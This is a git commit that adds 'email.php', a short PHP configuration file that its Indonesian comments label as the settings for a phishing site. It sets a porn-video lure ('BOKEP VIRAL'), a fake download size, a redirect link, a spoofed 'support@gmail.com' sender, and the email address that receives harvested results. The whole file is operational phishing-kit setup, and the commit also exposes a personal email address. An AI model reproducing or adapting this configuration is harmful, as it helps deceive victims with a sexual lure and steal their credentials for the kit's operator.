8b9a9c376629d55955154ca22cfb771fb67ca656
adistya765 <sambang870@gmail.com>
2023-05-26 10:39:53 +0700

    twnty commit

---
+++ email.php
@@ -0,0 +1,10 @@
+<?php
+
+$redirect = 'https://youtu.be/iO0n0ZP2XEk'; // LINK DOWNLOAD VIDEO
+$namavideo = 'BOKEP VIRAL'; // NAMA WEB PHISING MU
+$download = '10,1MB'; // UKURAN DOWNLOAD
+
+$sender = 'From: Web TIO <support@gmail.com>'; // NAMA RESULT MU
+$email = "sambang870@gmail.com"; // GANTI EMAIL MU
+
+?>
